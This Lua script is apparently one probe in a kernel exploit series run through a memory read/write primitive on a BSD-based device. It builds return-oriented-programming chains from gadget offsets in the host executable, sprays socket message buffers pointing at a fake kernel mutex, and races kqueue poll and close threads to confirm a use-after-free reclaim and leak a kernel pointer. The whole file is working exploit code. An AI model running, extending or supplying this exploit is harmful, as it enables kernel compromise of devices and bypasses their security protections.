-- CRASH_CLASS: HIGH
-- PROBE 500j: uint64 precision diagnostic + 500h re-test with corrected canaries
--
-- Context: 500h reported "canary modified" at fake_mtx+0x18/+0x20.
-- Hypothesis: Lua 5.1 double precision loss in uint64(0xDEAD0001DEAD0001)
-- rounded the value, making the "change" a false positive.
--
-- This probe:
--  A) Verify uint64 precision: numeric vs string constructor
--  B) Re-run 500h race with STRING canaries (exact 64-bit values)
--  C) Also test mtx_lock intermediate value detection (tight read loop)
--  D) If no canary change: test crash oracle (invalid si_mtx at +0x88)

print("=== PROBE 500j: PRECISION DIAGNOSTIC + 500h RETEST ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- ========== Section A: uint64 precision test ==========
print("")
print("--- A: uint64 PRECISION TEST ---")

local tb = memory.alloc(0x80)

-- Test 1: numeric constructor (Lua double precision)
wq(N(tb), uint64(0xDEAD0001DEAD0001))
local v1 = rq(uint64(N(tb)))
print("  numeric uint64(0xDEAD0001DEAD0001) = " .. fmt(v1))

-- Test 2: string constructor (should be exact)
wq(N(tb) + 8, uint64("0xDEAD0001DEAD0001"))
local v2 = rq(uint64(N(tb) + 8))
print("  string  uint64('0xDEAD0001DEAD0001') = " .. fmt(v2))

-- Test 3: compare high and low halves
local v1h, v1l = get_hi_lo(v1)
local v2h, v2l = get_hi_lo(v2)
print(string.format("  numeric: h=0x%08X l=0x%08X", v1h, v1l))
print(string.format("  string:  h=0x%08X l=0x%08X", v2h, v2l))

if v1l ~= v2l then
    print("  >>> PRECISION LOSS CONFIRMED: numeric lost low bits <<<")
    print("  >>> 500h canary 'modification' was a FALSE POSITIVE <<<")
else
    print("  precision OK — numeric and string match")
end

-- Test 4: smaller values (should be fine)
wq(N(tb) + 0x10, uint64(0xBB000001))
local v3 = rq(uint64(N(tb) + 0x10))
print("  uint64(0xBB000001) = " .. fmt(v3))

-- Test 5: format-constructed string
local test_hi, test_lo = 0xBB000001, 0xBB000001
wq(N(tb) + 0x18, uint64(string.format("0x%08X%08X", test_hi, test_lo)))
local v4 = rq(uint64(N(tb) + 0x18))
local v4h, v4l = get_hi_lo(v4)
print(string.format("  format('0x%08X%08X',%d,%d) = %s (h=%08X l=%08X)",
    test_hi, test_lo, test_hi, test_lo, fmt(v4), v4h, v4l))
local fmt_ok = (v4h == test_hi and v4l == test_lo)
print("  format constructor exact: " .. tostring(fmt_ok))

if not alive() then print("DIED in section A"); return end

-- ========== Section B: 500h retest with STRING canaries ==========
print("")
print("--- B: 500h RETEST (string canaries) ---")

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))
local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

-- Fake mutex with STRING canaries
local fake_mtx = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(fake_mtx) + i, 0) end

local function reset_fake_mtx()
    wq(N(fake_mtx), uint64(N(fake_mtx) + 0x28))  -- lo_name
    wd(N(fake_mtx) + 8, 1)  -- lo_flags
    wd(N(fake_mtx) + 0xC, 0)  -- lo_data
    wq(N(fake_mtx) + 0x10, uint64(4))  -- mtx_lock = MTX_UNOWNED
    -- STRING canaries (exact 64-bit values)
    wq(N(fake_mtx) + 0x18, uint64("0xDEAD0001DEAD0001"))
    wq(N(fake_mtx) + 0x20, uint64("0xDEAD0002DEAD0002"))
    wq(N(fake_mtx) + 0x28, uint64(0x4D))  -- "M\0" for lo_name
end

reset_fake_mtx()
local fake_mtx_addr = uint64(N(fake_mtx))
print("  fake_mtx=" .. fmt(fake_mtx_addr))

-- Verify canaries are written correctly
local vc1 = rq(uint64(N(fake_mtx) + 0x18))
local vc2 = rq(uint64(N(fake_mtx) + 0x20))
print("  verify c1=" .. fmt(vc1) .. " (expect 0xDEAD0001DEAD0001)")
print("  verify c2=" .. fmt(vc2) .. " (expect 0xDEAD0002DEAD0002)")
local vc1h, vc1l = get_hi_lo(vc1)
local vc2h, vc2l = get_hi_lo(vc2)
if vc1h == 0xDEAD0001 and vc1l == 0xDEAD0001 then
    print("  c1 write EXACT")
else
    print(string.format("  c1 WRONG: h=%08X l=%08X", vc1h, vc1l))
end
if vc2h == 0xDEAD0002 and vc2l == 0xDEAD0002 then
    print("  c2 write EXACT")
else
    print(string.format("  c2 WRONG: h=%08X l=%08X", vc2h, vc2l))
end

-- iov buffer: ALL qwords = &fake_mtx (same as 500h)
local iov_buf = memory.alloc(256 + 16)
for i = 0, 252, 8 do
    wq(N(iov_buf) + i, fake_mtx_addr)
end

local function make_msghdr()
    local mh = memory.alloc(0x30)
    wq(N(mh), uint64(0))
    wd(N(mh) + 8, 0)
    wq(N(mh) + 0x10, uint64(N(iov_buf)))
    wd(N(mh) + 0x18, 16)
    wq(N(mh) + 0x20, uint64(0))
    wd(N(mh) + 0x28, 0)
    wd(N(mh) + 0x2C, 0)
    return mh
end

-- Thread builders
local function build_poller(gate_rd, pollfd_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rdi); emit(uint64(pollfd_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(3000))
    emit(g_pop_rax); emit(uint64(209)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function build_closer(gate_rd, target_fd, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rdi); emit(uint64(target_fd))
    emit(g_pop_rax); emit(uint64(6)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function build_spray_child(gate_rd, sock_rd, msghdr_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rax); emit(uint64(1))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(sock_rd))
    emit(g_pop_rsi); emit(uint64(msghdr_addr))
    emit(g_pop_rdx); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(29)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- Run the 500h race with corrected canaries
local NUM_SPRAY = 10
local sc_kqueue = mk(362)

local function run_retest(label)
    print("[" .. label .. "]")
    reset_fake_mtx()

    -- Verify canaries BEFORE race
    local pre_c1 = rq(uint64(N(fake_mtx) + 0x18))
    local pre_c2 = rq(uint64(N(fake_mtx) + 0x20))
    local pre_ld = rd(N(fake_mtx) + 0xC) or -1
    local pre_mt = rq(uint64(N(fake_mtx) + 0x10))

    local kq = sgn(sc_kqueue())
    if kq < 0 then print("  kqueue fail"); return "fail" end

    local gA_r, gA_w = make_gate()
    local gB_r, gB_w = make_gate()
    if not gA_r then pcall(function() mk(6)(uint64(kq)) end); return "fail" end

    local spray = {}
    for s = 1, NUM_SPRAY do
        local sv = memory.alloc(8)
        wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
        pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
        local sr = rd(N(sv)) or 0xFFFF
        local sw = rd(N(sv) + 4) or 0xFFFF
        local gr, gw = make_gate()
        local smk = memory.alloc(8); wd(N(smk), 0); wd(N(smk) + 4, 0)
        local mh = make_msghdr()
        if sr ~= 0xFFFF and gr then
            pcall(function()
                mk(455)(build_spray_child(gr, sr, N(mh), N(smk)), uint64(0x38))
            end)
            spray[#spray + 1] = {rd=sr, wr=sw, gr=gr, gw=gw, mk=smk}
        end
    end
    print("  spray=" .. #spray)

    local pollfd = memory.alloc(8)
    wd(N(pollfd), kq); wd(N(pollfd) + 4, 0x00010000)
    local mA = memory.alloc(8); wd(N(mA), 0); wd(N(mA) + 4, 0xAA)
    local mB = memory.alloc(8); wd(N(mB), 0); wd(N(mB) + 4, 0xBB)

    pcall(function() mk(455)(build_poller(gA_r, N(pollfd), N(mA)), uint64(0x38)) end)
    pcall(function() mk(455)(build_closer(gB_r, kq, N(mB)), uint64(0x38)) end)

    pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)
    for d = 1, 50000 do local _ = rd(N(mA)) end

    pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)
    for w = 1, 500000 do
        if rd(N(mB) + 4) ~= 0xBB then break end
    end
    if not alive() then return "died_close" end

    for _, sd in ipairs(spray) do
        pcall(function() mk(4)(uint64(sd.gw), uint64(N(one_byte)), uint64(1)) end)
    end

    -- Section C: tight loop checking mtx_lock for transient curthread value
    local saw_kernel = false
    local kernel_val = nil
    for w = 1, 8000000 do
        if not alive() then break end

        -- Check mtx_lock for kernel pointer (transient lock state)
        local mv = rq(uint64(N(fake_mtx) + 0x10))
        local mh, ml = get_hi_lo(mv)
        if mh >= 0xFFFF8000 then
            saw_kernel = true
            kernel_val = fmt(mv)
        end

        if rd(N(mA) + 4) ~= 0xAA then break end
    end

    if not alive() then return "died_seltdclear" end

    -- Check canaries AFTER race
    local post_c1 = rq(uint64(N(fake_mtx) + 0x18))
    local post_c2 = rq(uint64(N(fake_mtx) + 0x20))
    local post_ld = rd(N(fake_mtx) + 0xC) or -1
    local post_mt = rq(uint64(N(fake_mtx) + 0x10))

    local pc1h, pc1l = get_hi_lo(post_c1)
    local pc2h, pc2l = get_hi_lo(post_c2)
    local ppc1h, ppc1l = get_hi_lo(pre_c1)
    local ppc2h, ppc2l = get_hi_lo(pre_c2)
    local pmth, pmtl = get_hi_lo(post_mt)

    local c1_changed = (pc1h ~= ppc1h or pc1l ~= ppc1l)
    local c2_changed = (pc2h ~= ppc2h or pc2l ~= ppc2l)
    local ld_changed = (post_ld ~= pre_ld)
    local mt_changed = (pmth ~= 0 or pmtl ~= 4)

    print("  c1: " .. fmt(pre_c1) .. " -> " .. fmt(post_c1) .. (c1_changed and " CHANGED" or " same"))
    print("  c2: " .. fmt(pre_c2) .. " -> " .. fmt(post_c2) .. (c2_changed and " CHANGED" or " same"))
    print("  ld: " .. pre_ld .. " -> " .. post_ld .. (ld_changed and " CHANGED" or " same"))
    print("  mt: " .. fmt(rq(uint64(N(fake_mtx) + 0x10))) .. (mt_changed and " CHANGED" or " =4"))
    if saw_kernel then
        print("  >>> CAUGHT KERNEL POINTER IN mtx_lock: " .. kernel_val .. " <<<")
        print("  >>> RECLAIM + mtx_lock CONFIRMED <<<")
    end

    -- Cleanup
    for _, sd in ipairs(spray) do
        pcall(function() mk(6)(uint64(sd.rd)) end)
        pcall(function() mk(6)(uint64(sd.wr)) end)
        pcall(function() mk(6)(uint64(sd.gr)) end)
        pcall(function() mk(6)(uint64(sd.gw)) end)
    end
    pcall(function() mk(6)(uint64(gA_r)) end); pcall(function() mk(6)(uint64(gA_w)) end)
    pcall(function() mk(6)(uint64(gB_r)) end); pcall(function() mk(6)(uint64(gB_w)) end)

    local any = c1_changed or c2_changed or ld_changed or mt_changed or saw_kernel
    return any and "hit" or "miss"
end

-- Run 3 iterations
local got_hit = false
for iter = 1, 3 do
    if not alive() then break end
    local r = run_retest(string.format("iter %d/3", iter))
    print("  result: " .. tostring(r))
    if r == "hit" then got_hit = true end
    if r and r:match("died") then got_hit = true; break end
    print("")
end

print("")
print("========================================")
if got_hit then
    print("RECLAIM CONFIRMED with corrected canaries")
    print("500h result was REAL (not just precision artifact)")
else
    print("NO CANARY CHANGE with corrected values")
    print("500h 'canary modified' WAS a Lua precision false positive")
    print("Reclaim may still work but is undetectable via canaries")
    print("Need: crash oracle or lo_data profiling check")
end
print("alive=" .. tostring(alive()))
print("========================================")
print("")
print("=== PROBE 500j COMPLETE ===")
